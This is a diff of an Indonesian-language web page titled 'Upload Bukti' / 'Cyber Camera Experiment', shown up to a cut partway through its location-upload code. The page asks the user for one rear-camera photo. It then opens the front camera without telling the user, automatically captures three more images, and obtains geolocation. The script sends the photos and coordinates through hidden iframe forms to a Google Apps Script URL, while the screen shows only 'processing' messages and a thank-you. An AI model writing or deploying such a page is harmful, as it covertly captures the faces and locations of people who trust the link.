@@ -5,10 +5,12 @@
 
   <meta charset="UTF-8">
 
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0">
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  >
 
-  <title>Upload Bukti</title>
+  <title>Cyber Camera Experiment</title>
 
 
   <style>
@@ -30,9 +32,19 @@
 
       align-items: center;
 
-      background: #f5f5f5;
+      background:
+        linear-gradient(
+          135deg,
+          #050505,
+          #111111
+        );
 
-      font-family: Arial, sans-serif;
+      font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+      color: white;
 
     }
 
@@ -43,9 +55,51 @@
 
       max-width: 420px;
 
-      padding: 20px;
+      padding: 24px;
 
       text-align: center;
+
+    }
+
+
+    h1 {
+
+      margin-bottom: 10px;
+
+      font-size: 25px;
+
+    }
+
+
+    .subtitle {
+
+      color: #aaa;
+
+      font-size: 14px;
+
+      margin-bottom: 25px;
+
+      line-height: 1.5;
+
+    }
+
+
+    video {
+
+      width: 100%;
+
+      border-radius: 18px;
+
+      background: #000;
+
+      display: none;
+
+    }
+
+
+    canvas {
+
+      display: none;
 
     }
 
@@ -58,206 +112,128 @@
 
       border: none;
 
-      border-radius: 12px;
+      border-radius: 14px;
 
-      background: #111;
-
-      color: white;
-
-      font-size: 18px;
+      font-size: 16px;
 
       font-weight: bold;
 
       cursor: pointer;
+
+      background: white;
+
+      color: black;
+
+      margin-top: 15px;
 
     }
 
 
     button:disabled {
 
-      opacity: 0.6;
+      opacity: 0.5;
 
       cursor: not-allowed;
 
     }
 
 
-    /* =====================================================
-       LIVE CAMERA
-       ===================================================== */
-
-    video {
-
-      width: 100%;
-
-      max-height: 70vh;
-
-      object-fit: cover;
-
-      border-radius: 14px;
-
-      margin-bottom: 15px;
-
-      background: #000;
-
-      display: none;
-
-    }
-
-
-    /* =====================================================
-       FOTO BEKU
-       ===================================================== */
-
-    canvas {
-
-      display: none;
-
-      width: 100%;
-
-      max-height: 70vh;
-
-      object-fit: cover;
-
-      border-radius: 14px;
-
-      margin-bottom: 15px;
-
-      background: #000;
-
-    }
-
-
-    /* =====================================================
-       LOADING
-       ===================================================== */
-
     .loading {
 
       display: none;
 
-      margin: 20px 0;
+      margin-top: 25px;
 
     }
 
 
     .spinner {
 
-      width: 42px;
+      width: 40px;
 
-      height: 42px;
+      height: 40px;
 
-      margin: 0 auto 12px;
+      margin: auto;
 
-      border: 4px solid #ddd;
+      border: 4px solid #444;
 
-      border-top: 4px solid #111;
+      border-top: 4px solid white;
 
       border-radius: 50%;
 
-      animation: spin 1s linear infinite;
+      animation:
+        spin 1s linear infinite;
+
+    }
+
+
+    @keyframes spin {
+
+      to {
+
+        transform: rotate(360deg);
+
+      }
 
     }
 
 
     .loading-text {
 
+      margin-top: 15px;
+
       font-size: 15px;
 
-      color: #444;
+    }
 
-      font-weight: 500;
+
+    .loading-warning {
+
+      margin-top: 8px;
+
+      color: #aaa;
+
+      font-size: 12px;
 
     }
 
 
-    .processing-note {
-
-      font-size: 14px;
-
-      color: #777;
-
-      margin-top: 6px;
-
-      line-height: 1.4;
-
-    }
-
-
-    /* =====================================================
-       LOCATION SUCCESS
-       ===================================================== */
-
-    .location-success {
+    .success {
 
       display: none;
 
-      margin-top: 20px;
+      margin-top: 30px;
 
-      font-size: 15px;
+    }
 
-      color: #333;
+
+    .success-icon {
+
+      font-size: 60px;
+
+      margin-bottom: 15px;
+
+    }
+
+
+    .success h2 {
+
+      margin: 0;
+
+      font-size: 28px;
+
+    }
+
+
+    .error {
+
+      display: none;
+
+      margin-top: 30px;
+
+      color: #ff6b6b;
 
       line-height: 1.5;
-
-    }
-
-
-    /* =====================================================
-       THANK YOU
-       ===================================================== */
-
-    .thank-you {
-
-      display: none;
-
-      font-size: 22px;
-
-      font-weight: bold;
-
-      color: #111;
-
-      margin-top: 20px;
-
-    }
-
-
-    /* =====================================================
-       LOCATION ERROR
-       ===================================================== */
-
-    .location-error {
-
-      display: none;
-
-      margin-top: 20px;
-
-      font-size: 15px;
-
-      line-height: 1.5;
-
-      color: #c00;
-
-    }
-
-
-    /* =====================================================
-       SPINNER
-       ===================================================== */
-
-    @keyframes spin {
-
-      0% {
-
-        transform: rotate(0deg);
-
-      }
-
-      100% {
-
-        transform: rotate(360deg);
-
-      }
 
     }
 
@@ -269,1139 +245,829 @@
 <body>
 
 
-<div class="container">
+  <div class="container">
 
 
-  <!-- =====================================================
-       CAMERA PREVIEW
-       ===================================================== -->
-
-  <video id="video"
-         autoplay
-         playsinline>
-  </video>
+    <h1>
+      Cyber Camera Experiment
+    </h1>
 
 
-  <!-- =====================================================
-       CANVAS
-       ===================================================== -->
-
-  <canvas id="canvas"></canvas>
+    <div class="subtitle">
+      Sistem pengujian kamera dan validasi lokasi.
+    </div>
 
 
-  <!-- =====================================================
-       BUTTON
-       ===================================================== -->
-
-  <button id="mainButton"
-          onclick="startProcess()">
-
-    Upload Bukti
-
-  </button>
+    <video
+      id="video"
+      autoplay
+      playsinline
+    ></video>
 
 
-  <!-- =====================================================
-       LOADING
-       ===================================================== -->
+    <canvas id="canvas"></canvas>
 
-  <div id="loading"
-       class="loading">
 
-    <div class="spinner"></div>
+    <button
+      id="mainButton"
+      onclick="startProcess()"
+    >
+      Upload Bukti
+    </button>
 
-    <div id="loadingText"
-         class="loading-text">
 
-      Sedang memproses...
+    <div
+      id="loading"
+      class="loading"
+    >
+
+      <div class="spinner"></div>
+
+      <div
+        id="loadingText"
+        class="loading-text"
+      >
+        Sedang memproses...
+      </div>
+
+      <div class="loading-warning">
+        Jangan menutup halaman ini.
+      </div>
 
     </div>
 
-    <div id="processingNote"
-         class="processing-note">
 
-      Jangan menutup halaman ini
+    <div
+      id="success"
+      class="success"
+    >
+
+      <div class="success-icon">
+        ✓
+      </div>
+
+      <h2>
+        Thank You
+      </h2>
 
     </div>
 
-  </div>
 
+    <div
+      id="error"
+      class="error"
+    >
 
-  <!-- =====================================================
-       LOCATION SUCCESS
-       ===================================================== -->
+      <div id="errorMessage"></div>
 
-  <div id="locationSuccess"
-       class="location-success">
+      <button
+        onclick="location.reload()"
+      >
+        Ulangi Pengiriman
+      </button>
 
-    ✓ Lokasi berhasil divalidasi
+    </div>
 
-  </div>
-
-
-  <!-- =====================================================
-       LOCATION ERROR
-       ===================================================== -->
-
-  <div id="locationError"
-       class="location-error">
-
-    Gagal, silakan ulang pengiriman dan pastikan
-    mengaktifkan lokasi device untuk validasi.
 
   </div>
-
-
-  <!-- =====================================================
-       THANK YOU
-       ===================================================== -->
-
-  <div id="thankYou"
-       class="thank-you">
-
-    Thank You
-
-  </div>
-
-
-</div>
-
 
 
 <script>
 
 
-  // =========================================================
-  // GOOGLE APPS SCRIPT
-  // =========================================================
+/**
+ * ==================================================
+ * GAS WEB APP URL
+ * ==================================================
+ *
+ * URL backend tetap diperlukan oleh browser
+ * GitHub Pages untuk mengirim data.
+ *
+ * SPREADSHEET ID TIDAK ADA DI SINI.
+ *
+ */
 
-  const GAS_URL =
-    "https://script.google.com/macros/s/AKfycbyTXqpKOHsVlUNhQ_vWe9o5kMBdYjkTCp7gQfky0h00ohNMgIDSTi5PtD3gZ_f-bc_a/exec";
+const GAS_URL =
+  'https://script.google.com/macros/s/AKfycbyTXqpKOHsVlUNhQ_vWe9o5kMBdYjkTCp7gQfky0h00ohNMgIDSTi5PtD3gZ_f-bc_a/exec';
 
 
-  // =========================================================
-  // ELEMENT
-  // =========================================================
+/**
+ * ==================================================
+ * SESSION ID
+ * ==================================================
+ */
 
-  const video =
-    document.getElementById("video");
+const sessionId =
+  'session_' +
+  Date.now() +
+  '_' +
+  Math.random()
+    .toString(36)
+    .substring(2, 8);
 
-  const canvas =
-    document.getElementById("canvas");
 
-  const button =
-    document.getElementById("mainButton");
+/**
+ * ==================================================
+ * ELEMENT
+ * ==================================================
+ */
 
-  const loading =
-    document.getElementById("loading");
+const video =
+  document.getElementById('video');
 
-  const loadingText =
-    document.getElementById("loadingText");
+const canvas =
+  document.getElementById('canvas');
 
-  const processingNote =
-    document.getElementById("processingNote");
+const mainButton =
+  document.getElementById('mainButton');
 
-  const locationSuccess =
-    document.getElementById("locationSuccess");
+const loading =
+  document.getElementById('loading');
 
-  const locationError =
-    document.getElementById("locationError");
+const loadingText =
+  document.getElementById('loadingText');
 
-  const thankYou =
-    document.getElementById("thankYou");
+const success =
+  document.getElementById('success');
 
+const errorBox =
+  document.getElementById('error');
 
-  let stream = null;
+const errorMessage =
+  document.getElementById('errorMessage');
 
 
-  // =========================================================
-  // SESSION ID
-  // =========================================================
+/**
+ * ==================================================
+ * STREAM
+ * ==================================================
+ */
 
-  const sessionId =
+let stream = null;
 
-    "session_" +
 
-    Date.now() +
+/**
+ * ==================================================
+ * START PROCESS
+ * ==================================================
+ */
 
-    "_" +
+async function startProcess() {
 
-    Math.random()
-      .toString(36)
-      .substring(2, 8);
+  try {
 
+    mainButton.disabled = true;
 
+    await openCamera('environment');
 
-  // =========================================================
-  // START
-  // =========================================================
+    mainButton.innerText =
+      'Ambil Foto';
 
-  async function startProcess() {
+    mainButton.disabled = false;
 
-
-    // -------------------------------------------------------
-    // HAPUS ERROR LAMA
-    // -------------------------------------------------------
-
-    locationError.style.display =
-      "none";
-
-
-    locationSuccess.style.display =
-      "none";
-
-
-    thankYou.style.display =
-      "none";
-
-
-    loading.style.display =
-      "none";
-
-
-    canvas.style.display =
-      "none";
-
-
-    video.style.display =
-      "none";
-
-
-    button.style.display =
-      "block";
-
-
-    button.disabled =
-      true;
-
-
-    button.innerText =
-      "Membuka kamera...";
-
-
-    try {
-
-
-      // =====================================================
-      // KAMERA BELAKANG
-      // =====================================================
-
-      await openCamera(
-        "environment"
-      );
-
-
-      video.style.display =
-        "block";
-
-
-      button.innerText =
-        "Ambil Foto";
-
-
-      button.onclick =
-        takeFirstPhoto;
-
-
-      button.disabled =
-        false;
-
-
-    }
-
-
-    catch (error) {
-
-
-      console.error(
-        "Camera error:",
-        error
-      );
-
-
-      alert(
-
-        "Kamera tidak dapat dibuka.\n\n" +
-
-        error.name +
-
-        ": " +
-
-        error.message
-
-      );
-
-
-      button.innerText =
-        "Upload Bukti";
-
-
-      button.onclick =
-        startProcess;
-
-
-      button.disabled =
-        false;
-
-    }
+    mainButton.onclick =
+      takeFirstPhoto;
 
   }
 
+  catch (error) {
 
+    console.error(error);
 
-  // =========================================================
-  // OPEN CAMERA
-  // =========================================================
-
-  async function openCamera(
-    cameraType
-  ) {
-
-
-    // -------------------------------------------------------
-    // STOP CAMERA SEBELUMNYA
-    // -------------------------------------------------------
-
-    stopCamera();
-
-
-    // -------------------------------------------------------
-    // REQUEST CAMERA
-    // -------------------------------------------------------
-
-    stream =
-
-      await navigator.mediaDevices
-        .getUserMedia({
-
-          video: {
-
-            facingMode: {
-
-              ideal: cameraType
-
-            },
-
-            width: {
-
-              ideal: 1280
-
-            },
-
-            height: {
-
-              ideal: 720
-
-            }
-
-          },
-
-          audio: false
-
-        });
-
-
-    // -------------------------------------------------------
-    // STREAM KE VIDEO
-    // -------------------------------------------------------
-
-    video.srcObject =
-      stream;
-
-
-    await video.play();
-
-  }
-
-
-
-  // =========================================================
-  // STOP CAMERA
-  // =========================================================
-
-  function stopCamera() {
-
-
-    if (stream) {
-
-
-      stream
-        .getTracks()
-        .forEach(
-
-          track => {
-
-            track.stop();
-
-          }
-
-        );
-
-
-      stream =
-        null;
-
-    }
-
-
-    video.srcObject =
-      null;
-
-  }
-
-
-
-  // =========================================================
-  // CAPTURE PHOTO
-  // =========================================================
-
-  function capturePhoto() {
-
-
-    if (
-
-      !video.videoWidth ||
-
-      !video.videoHeight
-
-    ) {
-
-
-      throw new Error(
-        "Kamera belum siap."
-      );
-
-    }
-
-
-    canvas.width =
-      video.videoWidth;
-
-
-    canvas.height =
-      video.videoHeight;
-
-
-    const ctx =
-      canvas.getContext("2d");
-
-
-    ctx.drawImage(
-
-      video,
-
-      0,
-
-      0,
-
-      canvas.width,
-
-      canvas.height
-
-    );
-
-
-    return canvas.toDataURL(
-
-      "image/jpeg",
-
-      0.85
-
+    showError(
+      'Kamera tidak dapat dibuka. Pastikan izin kamera diberikan.'
     );
 
   }
 
+}
 
 
-  // =========================================================
-  // FOTO PERTAMA
-  // =========================================================
+/**
+ * ==================================================
+ * OPEN CAMERA
+ * ==================================================
+ */
 
-  async function takeFirstPhoto() {
+async function openCamera(
+  cameraType
+) {
 
-
-    button.disabled =
-      true;
-
-
-    try {
-
-
-      // =====================================================
-      // 1. CAPTURE FOTO #1
-      // =====================================================
-
-      const image =
-        capturePhoto();
+  stopCamera();
 
 
-      // =====================================================
-      // 2. BUAT FOTO BEKU
-      // =====================================================
+  stream =
+    await navigator.mediaDevices.getUserMedia({
 
-      const frozenImage =
-        new Image();
+      video: {
 
+        facingMode: {
+          ideal: cameraType
+        },
 
-      frozenImage.src =
-        image;
+        width: {
+          ideal: 1280
+        },
 
-
-      await new Promise(
-
-        resolve => {
-
-          frozenImage.onload =
-            resolve;
-
+        height: {
+          ideal: 720
         }
 
-      );
+      },
 
+      audio: false
 
-      // -----------------------------------------------------
-      // CANVAS
-      // -----------------------------------------------------
+    });
 
-      canvas.width =
-        frozenImage.width;
 
+  video.srcObject =
+    stream;
 
-      canvas.height =
-        frozenImage.height;
 
+  video.style.display =
+    'block';
 
-      const ctx =
-        canvas.getContext(
-          "2d"
-        );
 
+  await video.play();
 
-      ctx.drawImage(
+}
 
-        frozenImage,
 
-        0,
+/**
+ * ==================================================
+ * STOP CAMERA
+ * ==================================================
+ */
 
-        0,
+function stopCamera() {
 
-        canvas.width,
-
-        canvas.height
-
-      );
-
-
-      // -----------------------------------------------------
-      // TAMPILKAN FOTO BEKU
-      // -----------------------------------------------------
-
-      video.style.display =
-        "none";
-
-
-      canvas.style.display =
-        "block";
-
-
-      // =====================================================
-      // 3. FREEZE 2 DETIK
-      // =====================================================
-
-      await delay(
-        2000
-      );
-
-
-      // =====================================================
-      // 4. LOADING
-      // =====================================================
-
-      loading.style.display =
-        "block";
-
-
-      loadingText.innerText =
-        "Sedang memproses...";
-
-
-      processingNote.innerText =
-        "Jangan menutup halaman ini";
-
-
-      // =====================================================
-      // 5. UPLOAD FOTO #1
-      // =====================================================
-
-      const success =
-
-        await uploadPhoto(
-
-          image,
-
-          1
-
-        );
-
-
-      if (!success) {
-
-
-        throw new Error(
-          "Upload foto pertama gagal."
-        );
-
-      }
-
-
-      // =====================================================
-      // 6. SEMBUNYIKAN BUTTON
-      // =====================================================
-
-      button.style.display =
-        "none";
-
-
-      // =====================================================
-      // 7. HAPUS FOTO BEKU
-      // =====================================================
-
-      canvas.style.display =
-        "none";
-
-
-      // =====================================================
-      // 8. STOP KAMERA BELAKANG
-      // =====================================================
-
-      stopCamera();
-
-
-      // =====================================================
-      // 9. BUKA KAMERA DEPAN
-      // =====================================================
-
-      await openCamera(
-        "user"
-      );
-
-
-      video.style.display =
-        "block";
-
-
-      // =====================================================
-      // 10. TUNGGU KAMERA DEPAN
-      // =====================================================
-
-      await delay(
-        1200
-      );
-
-
-      // =====================================================
-      // 11. CAPTURE #2
-      // =====================================================
-
-      await automaticCapture(
-        2
-      );
-
-
-      // =====================================================
-      // 12. CAPTURE #3
-      // =====================================================
-
-      await automaticCapture(
-        3
-      );
-
-
-      // =====================================================
-      // 13. CAPTURE #4
-      // =====================================================
-
-      await automaticCapture(
-        4
-      );
-
-
-      // =====================================================
-      // 14. SEMUA FOTO SELESAI
-      // =====================================================
-
-      stopCamera();
-
-
-      video.style.display =
-        "none";
-
-
-      // =====================================================
-      // 15. REQUEST LOCATION
-      // =====================================================
-
-      loading.style.display =
-        "block";
-
-
-      loadingText.innerText =
-        "Meminta akses lokasi...";
-
-
-      processingNote.innerText =
-        "Izinkan akses lokasi untuk validasi bukti.";
-
-
-      // =====================================================
-      // 16. MINTA LOKASI
-      // =====================================================
-
-      try {
-
-
-        const location =
-          await requestLocation();
-
-
-        console.log(
-          "LOCATION SUCCESS:",
-          location
-        );
-
-
-        // ===================================================
-        // 17. LOKASI BERHASIL
-        // ===================================================
-
-        loading.style.display =
-          "none";
-
-
-        locationSuccess.style.display =
-          "block";
-
-
-        // ---------------------------------------------------
-        // Tampilkan sebentar
-        // ---------------------------------------------------
-
-        await delay(
-          1500
-        );
-
-
-        locationSuccess.style.display =
-          "none";
-
-
-        thankYou.style.display =
-          "block";
-
-
-      }
-
-
-      catch (locationErr) {
-
-
-        console.error(
-          "LOCATION FAILED:",
-          locationErr
-        );
-
-
-        // ===================================================
-        // 18. LOKASI GAGAL
-        // ===================================================
-
-        loading.style.display =
-          "none";
-
-
-        thankYou.style.display =
-          "none";
-
-
-        locationSuccess.style.display =
-          "none";
-
-
-        locationError.style.display =
-          "block";
-
-
-        button.style.display =
-          "block";
-
-
-        button.disabled =
-          false;
-
-
-        button.innerText =
-          "Ulangi Pengiriman";
-
-
-        button.onclick =
-          startProcess;
-
-      }
-
-
-    }
-
-
-    catch (error) {
-
-
-      console.error(
-        "Process error:",
-        error
-      );
-
-
-      stopCamera();
-
-
-      canvas.style.display =
-        "none";
-
-
-      video.style.display =
-        "none";
-
-
-      loading.style.display =
-        "none";
-
-
-      button.style.display =
-        "block";
-
-
-      button.disabled =
-        false;
-
-
-      button.innerText =
-        "Upload Bukti";
-
-
-      button.onclick =
-        startProcess;
-
-
-      alert(
-
-        "Terjadi kesalahan:\n\n" +
-
-        error.message
-
-      );
-
-    }
-
+  if (!stream) {
+    return;
   }
 
 
-
-  // =========================================================
-  // AUTOMATIC CAPTURE
-  // =========================================================
-
-  async function automaticCapture(
-    number
-  ) {
-
-
-    // -------------------------------------------------------
-    // TUNGGU
-    // -------------------------------------------------------
-
-    await delay(
-      1200
+  stream
+    .getTracks()
+    .forEach(
+      track => track.stop()
     );
 
 
-    // -------------------------------------------------------
-    // CAPTURE
-    // -------------------------------------------------------
+  stream = null;
+
+  video.srcObject = null;
+
+}
+
+
+/**
+ * ==================================================
+ * CAPTURE PHOTO
+ * ==================================================
+ */
+
+function capturePhoto() {
+
+  const width =
+    video.videoWidth;
+
+  const height =
+    video.videoHeight;
+
+
+  canvas.width =
+    width;
+
+  canvas.height =
+    height;
+
+
+  const context =
+    canvas.getContext('2d');
+
+
+  context.drawImage(
+    video,
+    0,
+    0,
+    width,
+    height
+  );
+
+
+  return canvas.toDataURL(
+    'image/jpeg',
+    0.85
+  );
+
+}
+
+
+/**
+ * ==================================================
+ * FIRST PHOTO
+ * ==================================================
+ */
+
+async function takeFirstPhoto() {
+
+  try {
+
+    mainButton.style.display =
+      'none';
+
+    loading.style.display =
+      'block';
+
+
+    /**
+     * ----------------------------------------------
+     * FREEZE
+     * ----------------------------------------------
+     */
 
     const image =
       capturePhoto();
 
 
-    // -------------------------------------------------------
-    // UPLOAD
-    // -------------------------------------------------------
-
-    const success =
-
-      await uploadPhoto(
-
-        image,
-
-        number
-
-      );
+    video.style.display =
+      'none';
 
 
-    // -------------------------------------------------------
-    // CEK
-    // -------------------------------------------------------
-
-    if (!success) {
+    loadingText.innerText =
+      'Memproses foto 1 dari 4...';
 
 
-      throw new Error(
+    /**
+     * ----------------------------------------------
+     * UPLOAD PHOTO 1
+     * ----------------------------------------------
+     */
 
-        "Upload capture #" +
-
-        number +
-
-        " gagal."
-
-      );
-
-    }
+    await uploadPhoto(
+      image,
+      1
+    );
 
 
-    // -------------------------------------------------------
-    // JEDA
-    // -------------------------------------------------------
+    /**
+     * ----------------------------------------------
+     * FRONT CAMERA
+     * ----------------------------------------------
+     */
 
-    await delay(
-      800
+    loadingText.innerText =
+      'Menyiapkan kamera depan...';
+
+
+    await openCamera('user');
+
+
+    /**
+     * ----------------------------------------------
+     * PHOTO 2
+     * ----------------------------------------------
+     */
+
+    await automaticCapture(2);
+
+
+    /**
+     * ----------------------------------------------
+     * PHOTO 3
+     * ----------------------------------------------
+     */
+
+    await automaticCapture(3);
+
+
+    /**
+     * ----------------------------------------------
+     * PHOTO 4
+     * ----------------------------------------------
+     */
+
+    await automaticCapture(4);
+
+
+    /**
+     * ----------------------------------------------
+     * STOP CAMERA
+     * ----------------------------------------------
+     */
+
+    stopCamera();
+
+
+    /**
+     * ----------------------------------------------
+     * REQUEST LOCATION
+     * ----------------------------------------------
+     */
+
+    loadingText.innerText =
+      'Memvalidasi lokasi...';
+
+
+    const location =
+      await requestLocation();
+
+
+    /**
+     * ----------------------------------------------
+     * SAVE LOCATION
+     * ----------------------------------------------
+     */
+
+    loadingText.innerText =
+      'Menyimpan validasi lokasi...';
+
+
+    await uploadLocation(
+      location
+    );
+
+
+    /**
+     * ----------------------------------------------
+     * SUCCESS
+     * ----------------------------------------------
+     */
+
+    loading.style.display =
+      'none';
+
+
+    success.style.display =
+      'block';
+
+
+  }
+
+  catch (error) {
+
+    console.error(error);
+
+    stopCamera();
+
+    loading.style.display =
+      'none';
+
+
+    showError(
+      error.message ||
+      'Gagal melakukan pengiriman.'
     );
 
   }
 
+}
 
 
-  // =========================================================
-  // REQUEST LOCATION
-  // =========================================================
+/**
+ * ==================================================
+ * AUTOMATIC CAPTURE
+ * ==================================================
+ */
 
-  async function requestLocation() {
+async function automaticCapture(
+  number
+) {
 
-
-    // -------------------------------------------------------
-    // CEK SUPPORT
-    // -------------------------------------------------------
-
-    if (!navigator.geolocation) {
-
-
-      throw new Error(
-        "Perangkat atau browser tidak mendukung lokasi."
-      );
-
-    }
+  await sleep(1200);
 
 
-    // -------------------------------------------------------
-    // CEK PERMISSION STATUS
-    // -------------------------------------------------------
-
-    if (navigator.permissions) {
-
-
-      try {
+  loadingText.innerText =
+    'Memproses foto ' +
+    number +
+    ' dari 4...';
 
 
-        const permission =
-
-          await navigator.permissions.query({
-
-            name:
-              "geolocation"
-
-          });
+  const image =
+    capturePhoto();
 
 
-        console.log(
-          "Location permission:",
-          permission.state
+  await uploadPhoto(
+    image,
+    number
+  );
+
+
+  await sleep(800);
+
+}
+
+
+/**
+ * ==================================================
+ * UPLOAD PHOTO
+ * ==================================================
+ */
+
+function uploadPhoto(
+  image,
+  number
+) {
+
+  return new Promise(
+    (resolve, reject) => {
+
+
+      /**
+       * --------------------------------------------
+       * IFRAME
+       * --------------------------------------------
+       */
+
+      const iframe =
+        document.createElement(
+          'iframe'
         );
 
 
-        // ---------------------------------------------------
-        // SUDAH DITOLAK
-        // ---------------------------------------------------
-
-        if (
-          permission.state ===
-          "denied"
-        ) {
+      iframe.style.display =
+        'none';
 
 
-          throw new Error(
+      iframe.name =
+        'uploadFrame_' +
+        Date.now() +
+        '_' +
+        number;
 
-            "Akses lokasi sebelumnya ditolak."
 
+      document.body.appendChild(
+        iframe
+      );
+
+
+      /**
+       * --------------------------------------------
+       * FORM
+       * --------------------------------------------
+       */
+
+      const form =
+        document.createElement(
+          'form'
+        );
+
+
+      form.method =
+        'POST';
+
+      form.action =
+        GAS_URL;
+
+      form.target =
+        iframe.name;
+
+
+      /**
+       * --------------------------------------------
+       * PAYLOAD
+       * --------------------------------------------
+       */
+
+      const payload = {
+
+        type: 'PHOTO',
+
+        id: sessionId,
+
+        captureNumber: number,
+
+        image: image
+
+      };
+
+
+      /**
+       * --------------------------------------------
+       * HIDDEN INPUT
+       * --------------------------------------------
+       */
+
+      const input =
+        document.createElement(
+          'input'
+        );
+
+
+      input.type =
+        'hidden';
+
+      input.name =
+        'payload';
+
+      input.value =
+        JSON.stringify(
+          payload
+        );
+
+
+      form.appendChild(
+        input
+      );
+
+
+      document.body.appendChild(
+        form
+      );
+
+
+      /**
+       * --------------------------------------------
+       * LOAD
+       * --------------------------------------------
+       */
+
+      iframe.onload =
+        function() {
+
+          setTimeout(
+            function() {
+
+              cleanup();
+
+              resolve();
+
+            },
+            1000
           );
+
+        };
+
+
+      /**
+       * --------------------------------------------
+       * SUBMIT
+       * --------------------------------------------
+       */
+
+      form.submit();
+
+
+      /**
+       * --------------------------------------------
+       * CLEANUP
+       * --------------------------------------------
+       */
+
+      function cleanup() {
+
+        try {
+
+          form.remove();
+
+          iframe.remove();
 
         }
 
-      }
+        catch (e) {}
 
-
-      catch (permissionError) {
-
-
-        console.log(
-
-          "Permission API:",
-          permissionError
-
-        );
-
-        // Tetap lanjut ke getCurrentPosition()
       }
 
     }
+  );
+
+}
 
 
-    // -------------------------------------------------------
-    // REQUEST LOCATION
-    // -------------------------------------------------------
+/**
+ * ==================================================
+ * REQUEST LOCATION
+ * ==================================================
+ */
 
-    return new Promise(
+function requestLocation() {
 
-      function(
-        resolve,
-        reject
+  return new Promise(
+    (resolve, reject) => {
+
+
+      /**
+       * --------------------------------------------
+       * SUPPORT
+       * --------------------------------------------
+       */
+
+      if (
+        !navigator.geolocation
       ) {
 
+        reject(
+          new Error(
+            'Perangkat tidak mendukung lokasi.'
+          )
+        );
+
+        return;
+
+      }
+
+
+      /**
+       * --------------------------------------------
+       * PERMISSION CHECK
+       * --------------------------------------------
+       */
+
+      if (
+        navigator.permissions
+      ) {
+
+        navigator.permissions
+          .query({
+            name: 'geolocation'
+          })
+
+          .then(
+            permission => {
+
+              if (
+                permission.state ===
+                'denied'
+              ) {
+
+                reject(
+                  new Error(
+                    'Gagal, silakan ulang pengiriman dan pastikan mengaktifkan lokasi device untuk validasi.'
+                  )
+                );
+
+                return;
+
+              }
+
+
+              getLocation();
+
+            }
+          )
+
+          .catch(
+            () => {
+
+              getLocation();
+
+            }
+          );
+
+      }
+
+      else {
+
+        getLocation();
+
+      }
+
+
+      /**
+       * --------------------------------------------
+       * GET LOCATION
+       * -------------------------------------------- */
+
+      function getLocation() {
 
         navigator.geolocation
           .getCurrentPosition(
 
+            position => {
 
-            // ===============================================
-            // SUCCESS
-            // ===============================================
-
-            function(
-              position
-            ) {
-
-
-              const data = {
-
+              resolve({
 
                 latitude:
                   position.coords.latitude,
 
-
                 longitude:
                   position.coords.longitude,
-
 
                 accuracy:
                   position.coords.accuracy,
 
-
                 timestamp:
                   position.timestamp
 
-              };
-
-
-              console.log(
-                "Latitude:",
-                data.latitude
-              );
-
-
-              console.log(
-                "Longitude:",
-                data.longitude
-              );
-
-
-              console.log(
-                "Accuracy:",
-                data.accuracy
-              );
-
-
-              resolve(
-                data
-              );
+              });
 
             },
 
-
-            // ===============================================
-            // ERROR
-            // ===============================================
-
-            function(
-              error
-            ) {
-
+            error => {
 
               console.error(
-
-                "Geolocation error:",
-
+                'Location error:',
                 error
-
               );
-
-
-              let message =
-
-                "Akses lokasi gagal.";
-
-
-              if (
-                error.code ===
-                1
-              ) {
-
-                message =
-                  "Akses lokasi ditolak.";
-
-              }
-
-
-              else if (
-                error.code ===
-                2
-              ) {
-
-                message =
-                  "Lokasi perangkat tidak tersedia.";
-
-              }
-
-
-              else if (
-                error.code ===
-                3
-              ) {
-
-                message =
-                  "Waktu permintaan lokasi habis.";
-
-              }
 
 
               reject(
                 new Error(
-                  message
+                  'Gagal, silakan ulang pengiriman dan pastikan mengaktifkan lokasi device untuk validasi.'
                 )
               );
 
             },
-
-
-            // ===============================================
-            // OPTIONS
-            // ===============================================
 
             {
 
@@ -1420,295 +1086,240 @@
 
       }
 
-    );
+    }
+  );
 
-  }
-
-
-
-  // =========================================================
-  // UPLOAD FOTO
-  // =========================================================
-
-  function uploadPhoto(
-    image,
-    number
-  ) {
+}
 
 
-    return new Promise(
+/**
+ * ==================================================
+ * UPLOAD LOCATION
+ * ==================================================
+ */
 
-      function(resolve) {
+function uploadLocation(
+  location
+) {
 
-
-        // ---------------------------------------------------
-        // IFRAME
-        // ---------------------------------------------------
-
-        const iframe =
-          document.createElement(
-            "iframe"
-          );
-
-
-        const iframeName =
-
-          "uploadFrame_" +
-
-          Date.now() +
-
-          "_" +
-
-          Math.random()
-
-            .toString(36)
-
-            .substring(2);
+  return new Promise(
+    (resolve, reject) => {
 
 
-        iframe.name =
-          iframeName;
+      /**
+       * --------------------------------------------
+       * IFRAME
+       * --------------------------------------------
+       */
 
-
-        iframe.style.display =
-          "none";
-
-
-        document.body.appendChild(
-          iframe
+      const iframe =
+        document.createElement(
+          'iframe'
         );
 
 
-        // ---------------------------------------------------
-        // FORM
-        // ---------------------------------------------------
+      iframe.style.display =
+        'none';
 
-        const form =
-          document.createElement(
-            "form"
+
+      iframe.name =
+        'locationFrame_' +
+        Date.now();
+
+
+      document.body.appendChild(
+        iframe
+      );
+
+
+      /**
+       * --------------------------------------------
+       * FORM
+       * --------------------------------------------
+       */
+
+      const form =
+        document.createElement(
+          'form'
+        );
+
+
+      form.method =
+        'POST';
+
+
+      form.action =
+        GAS_URL;
+
+
+      form.target =
+        iframe.name;
+
+
+      /**
+       * --------------------------------------------
+       * PAYLOAD
+       * --------------------------------------------
+       */
+
+      const payload = {
+
+        type: 'LOCATION',
+
+        id: sessionId,
+
+        latitude:
+          location.latitude,
+
+        longitude:
+          location.longitude,
+
+        accuracy:
+          location.accuracy
+
+      };
+
+
+      /**
+       * --------------------------------------------
+       * INPUT
+       * --------------------------------------------
+       */
+
+      const input =
+        document.createElement(
+          'input'
+        );
+
+
+      input.type =
+        'hidden';
+
+
+      input.name =
+        'payload';
+
+
+      input.value =
+        JSON.stringify(
+          payload
+        );
+
+
+      form.appendChild(
+        input
+      );
+
+
+      document.body.appendChild(
+        form
+      );
+
+
+      /**
+       * --------------------------------------------
+       * LOAD
+       * --------------------------------------------
+       */
+
+      iframe.onload =
+        function() {
+
+          setTimeout(
+            function() {
+
+              cleanup();
+
+              resolve();
+
+            },
+            1000
           );
-
-
-        form.method =
-          "POST";
-
-
-        form.action =
-          GAS_URL;
-
-
-        form.target =
-          iframeName;
-
-
-        form.style.display =
-          "none";
-
-
-        // ---------------------------------------------------
-        // PAYLOAD
-        // ---------------------------------------------------
